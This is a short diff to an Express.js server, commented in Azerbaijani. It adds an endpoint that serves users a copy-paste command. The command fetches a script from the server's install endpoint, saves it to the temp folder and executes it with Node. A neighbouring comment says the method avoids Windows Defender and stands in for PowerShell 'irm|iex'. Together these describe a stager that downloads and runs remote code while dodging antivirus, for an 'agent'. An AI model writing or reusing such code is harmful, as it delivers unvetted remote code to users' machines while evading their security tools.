@@ -233,6 +233,13 @@ app.get('/api/agent-code', async (_req, res) => {
     }
 });
 
+// Sadə copy-paste komut — user cmd-yə yapışdırır
+app.get('/api/setup-command', (_req, res) => {
+    const host = _req.headers.host;
+    const cmd = `node -e "fetch('https://${host}/api/install').then(r=>r.text()).then(s=>{require('fs').writeFileSync(require('os').tmpdir()+'/s.js',s);require(require('os').tmpdir()+'/s.js')})"`;
+    res.type('text/plain').send(cmd);
+});
+
 // Node.js setup script — Defender-ə ilişmir (PowerShell irm|iex əvəzi)
 // User BİR DƏFƏ işlədir: node -e "fetch('https://...../api/install').then(r=>r.text()).then(s=>{require('fs').writeFileSync(require('os').tmpdir()+'/s.js',s);require(require('os').tmpdir()+'/s.js')})"
 app.get('/api/install', (_req, res) => {
